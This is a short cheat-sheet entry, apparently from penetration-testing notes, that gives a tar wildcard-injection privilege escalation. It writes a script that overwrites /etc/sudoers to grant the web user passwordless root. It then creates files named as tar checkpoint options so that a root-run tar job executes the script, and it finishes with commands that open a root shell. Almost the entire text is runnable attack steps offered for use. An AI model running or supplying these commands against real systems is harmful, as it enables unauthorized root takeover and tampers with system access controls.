- - -
## Exploiting Tar ( 3rd method )  : 

> [! NOTE ] 
> Replace “**/var/www/html** ” with the location where you want to save Tar files.

> [! NOTE ] 
> Replace “**www-data**” with your current user.

```sh 
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > r00t.sh
```

```sh
echo "/var/www/html" > "--checkpoint-action=exec=sh r00t.sh"
```

```sh
echo "/var/www/html" > --checkpoint=1
```

```sh
sudo -l
```

```sh
sudo bash
```

- - -
